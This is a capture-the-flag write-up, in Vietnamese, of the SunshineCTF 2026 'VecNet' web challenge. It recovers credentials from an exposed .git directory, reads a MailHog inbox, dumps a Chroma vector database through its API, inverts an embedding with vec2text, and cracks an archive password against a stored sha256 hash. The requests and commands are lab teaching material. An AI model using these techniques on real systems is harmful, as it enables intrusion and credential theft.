---
title: "VecNet — Web (Hard)"
date: 2026-09-28 16:53:17 +0700
lastmod_at: 2026-09-28 16:53:17 +0700
categories: [Web]
tags: [sunshinectf, Web]
image:
  path: /CTFWU/SunshineCTF%202026/vecnet/files/de.png
---
{% raw %}
**Flag:** `sun{k33p_your_emb3ddings_secur3!}`

## Đề bài

"VecNet makes use of AI embedding technologies to speed up your database needs. Get started
today!" - `https://vec.web.2026.sunshinectf.games/`, không kèm file.

Bài đi qua bốn lớp, mỗi lớp mở một khoá của lớp sau: `/.git` công khai trả lại một `config.php`
đã bị revert, `config.php` cho credentials để đọc MailHog, MailHog cho tham số vec2text và đường
dẫn tới `specs.7z`, còn Chroma trên cổng 8000 giữ ba record mà một trong số đó chỉ còn vector 768
chiều. vec2text trả lại câu mô tả cấu trúc mật khẩu của archive, và mật khẩu được tìm bằng cách
băm vào một hash có sẵn trong database.

Phần còn lại của bề mặt bài (SQLi, SSRF, XSS) không có đường vào; các giả thuyết đã kiểm tra và
loại nằm ở cuối bài.

## Phân tích ban đầu

```
443   Apache/2.4.68 + PHP/8.2.33   docroot = repo Git, /.git public
8025  MailHog web UI               chặn sau nginx Basic auth
8000  GET /api/v2 -> {"nanosecond heartbeat": ...}   = Chroma
```

Cổng 8000 tìm được bằng cách quét cổng công khai của host. `paths.py` gọi thử `/api/v2` trên cả
443/8025/8000; chỉ 8000 trả JSON heartbeat.

## Chuỗi khai thác

### Bước 1 - `/.git`: file đã revert vẫn còn object

Reflog (`/.git/logs/HEAD`) liệt kê đủ 5 SHA nên không phải đoán. `githist.py` là loose-object
reader tối thiểu (zlib, `<type> <len>\0<content>`; tree entry `<mode> <name>\0<20-byte sha>`), đi
lần lượt từng commit và in tree:

```
3e02a92  initial site deploy
517ac72  add embed preview endpoint
c3cd120  add internal service config          <- config.php
130e195  REVERT: do not commit secrets        <- xoá file, thêm .gitignore
e6a0074  add htaccess                         <- HEAD
```

`git rm` chỉ xoá khỏi tree; blob cũ vẫn nằm ở `.git/objects/c3/...` và Apache phục vụ thư mục đó
như file tĩnh:

```php
define('MAIL_ADMIN_URL',  'http://127.0.0.1:8025');
define('MAIL_ADMIN_USER', 'vecadmin');
define('MAIL_ADMIN_PASS', 'Emb3dPass2026!');
define('INTERNAL_API_KEY', 'vsk_live_aX92kLmNpQrStUvWxYz');
```

`INTERNAL_API_KEY` không dùng được việc gì. Chroma ở đây xác thực bằng HTTP Basic, và key này
không làm thay đổi phản hồi của bất kỳ route nào trong 626 shape đã quét.

### Bước 2 - MailHog cho tham số, không cho cờ

`GET http://...:8025/api/v2/messages` với Basic auth `vecadmin:Emb3dPass2026!` trả hết mailbox.
Ba thư, không có cờ, nhưng có hai chi tiết:

* Greg gửi Mike: "Here are the vec2text specifications you were asking for earlier:
  num_steps=4, sequence_beam_width=5", kèm link `http://...:8025/files/specs.7z`.
* Greg gửi Steve: "our ChromaDB database is not exposed to the open Internet, and is only
  accessible on our local servers, served with proper authentication to our web interface". Câu
  này đúng theo nghĩa đen, Chroma không expose ra Internet; nó nằm ở cổng 8000 của cùng host.

### Bước 3 - `fetch.php` và `specs.7z`

```php
const ALLOWED_URL = 'http://localhost/files/specs.7z';
if (!isset($_GET['url']) || !hash_equals(ALLOWED_URL, $_GET['url'])) fail_request(403, ...);
readfile('/var/www/html/files/specs.7z');
```

Chỉ nhận GET, chỉ nhận đúng một giá trị `url`, và không phát request nào ra ngoài. Thứ lấy được là
archive:

```
Method = LZMA2:12 7zAES     1 member: flag.txt, 34 byte
```

Danh sách file trong archive không bị mã hoá nên `7z l -slt` cho biết trước độ dài cờ. Toàn bộ
credential có trong tay (`Emb3dPass2026!`, `vsk_live_...`, `sunshinectf8_`, sha256 có sẵn) đều trả
"Wrong password".

### Bước 4 - Chroma: dựng lại đường đi của route

`GET /api/v2/collections` trả

```json
{"error":"route not allowed"}
```

giống hệt 625 route vô nghĩa khác, nên dễ đọc nhầm thành "cần authentication đặc biệt". Chroma
1.x không có route đó; `/api/v2/collections` là shape của v1, còn bản 1.x theo tenant. Bảng route
lấy từ wheel (`chromadb/server/fastapi/__init__.py`, tải bằng `pip download chromadb==1.0.0
--no-deps` chỉ để đọc):

```
/api/v2/auth/identity
/api/v2/tenants/{tenant}/databases/{database}/collections
/api/v2/tenants/{tenant}/databases/{database}/collections/{uuid}/get     POST
```

`auth/identity` nằm trong nhóm route được phép và trả luôn tên tenant với database:

```json
{"user_id":"","tenant":"default_tenant","databases":["default_database"]}
```

Ghép lại:

```
GET  /api/v2/tenants/default_tenant/databases/default_database/collections
 -> [{"id":"455b419b-...","name":"VecNetDB","dimension":768,
      "configuration_json":{...,"embedding_function":null}, ...}]

POST /api/v2/tenants/default_tenant/databases/default_database
     /collections/455b419b-.../get
     {"include":["metadatas","documents","embeddings","uris"]}
```

Hai chỗ phải đúng: path dùng UUID (đặt tên `VecNetDB` vào vẫn bị `route not allowed`), và `include`
chỉ nhận năm khoá; gọi sai thì server trả 422 liệt kê luôn các giá trị hợp lệ
(`distances, documents, embeddings, metadatas, uris`).

Nội dung collection:

| id | type | document |
| --- | --- | --- |
| `magic_string` | plaintext | `sunshinectf8_` |
| `user_hash_sha256` | plaintext | `d8dd241199d2617765d7613fdd1df5358297b55f258647fe463de586bbfe3ebf` |
| `user_password_requirements` | embedding_only | `null`, vector 768 chiều |

Hai record plaintext không mở được archive. Record bị giấu text có `embedding_fn` là
`jxm/gtr__nq__32`, đúng checkpoint mà vec2text nạp cho đường `gtr-base`, nên bộ tham số trong thư
của Greg dùng được ngay.

### Bước 5 - vec2text

`pip install vec2text sentence-transformers` trên Windows cần hai vá, cả hai do lệch phiên bản:

* `vec2text/__init__.py` import `experiments`, mà file này `import resource` (chỉ có trên POSIX).
  Stub `sys.modules["resource"]` trước khi import.
* vec2text pin `low_cpu_mem_usage=True`; transformers 5 khởi tạo model trong `init_empty_weights()`
  nên default device thành `meta`, rồi `InversionModel.__init__` lại nạp một T5 thật từ trong
  context đó và `check_and_set_device_map()` raise. Lùi về `transformers==4.53.2` +
  `sentence-transformers<4`.

Control chạy trên vector đã biết đáp án:

```
inversion(vec(magic_string)) -> '   suncf8_ '      cos 0.85
```

Lệch đúng kiểu vec2text hay gặp (mất `shin`, `t`), tức harness hoạt động. Với
`user_password_requirements`:

```
The user's first and last initials, three special characters followed by the magic string.
```

Có thêm một cách kiểm tra không phụ thuộc chất lượng câu trả lời: dùng chính GTR frozen bên trong
corrector nhúng lại hypothesis rồi so cosine với vector đã lưu. cos = 0.9956, cao hơn hẳn control,
nên câu trên được lấy nguyên văn.

### Bước 6 - Mật khẩu: băm vào sha256 thay vì vào 7z

Câu đó cho cấu trúc, không cho chữ:

```
<initials><3 special characters>sunshinectf8_
```

Không gian là `26*26` cặp chữ cái × 4 dạng hoa/thường × `32^3` ký tự đặc biệt = 88.6M tổ hợp. Thử
trực tiếp lên archive thì mỗi lần hết ~0.2s, tức hơn 200 giờ. Nhưng collection đã cho sẵn
`user_hash_sha256`, và một lần sha256 hết ~1µs: toàn bộ không gian chạy trong ~35 giây với 8
process (`crack2.py`), chỉ ứng viên khớp digest mới được đưa sang 7z.

```
[+] GR$*#sunshinectf8_
```

`GR` là tên viết tắt của Greg Roberts, ba ký tự đặc biệt là `$*#`.

### Bước 7 - Mở archive

```
$ python -c "subprocess.run(['7z','x','-y','-pGR$*#sunshinectf8_','-oanalysis/unpacked','files/specs.7z'])"
Everything is Ok
Size: 34

$ cat analysis/unpacked/flag.txt
sun{k33p_your_emb3ddings_secur3!}
```

## Flag
```
sun{k33p_your_emb3ddings_secur3!}
```

## Các hướng đã loại

| Hướng | Bằng chứng loại |
| --- | --- |
| SSRF qua `fetch.php` | `hash_equals` với một chuỗi cố định, GET-only, chỉ `readfile` file cục bộ |
| IMAP/SMTP mailstore | có nhắc trong `index.html` nhưng cổng không mở ra ngoài |
| Token auth cho Chroma | `INTERNAL_API_KEY` không đổi phản hồi của bất kỳ route nào trong 626 shape đã quét |
| Đường `/api/v2/collections` | route của v1; 1.x trả `route not allowed` vì route không tồn tại |
| Cờ nằm trong MailHog | đọc hết 3 thư, không có chuỗi `sun{` |
| Mật khẩu là một credential có sẵn | 7z trả "Wrong password" với mọi ứng viên |
| sentence-transformers để tạo vector đối chiếu | `jxm/gtr__nq__32` trên HF là checkpoint của vec2text chứ không phải ST model; đường này chết, nhưng corrector đã có sẵn embedder nên vẫn có oracle cosine |

## Reproduce

```
python exploit.py            # ~40s, không cần torch
python exploit.py --invert   # chạy cả vec2text, ~3 phút (model đã cache)
```

Cả hai đường đều đã chạy lại trên instance sống sau khi lấy cờ và cho ra đúng cờ ở trên.

{% endraw %}
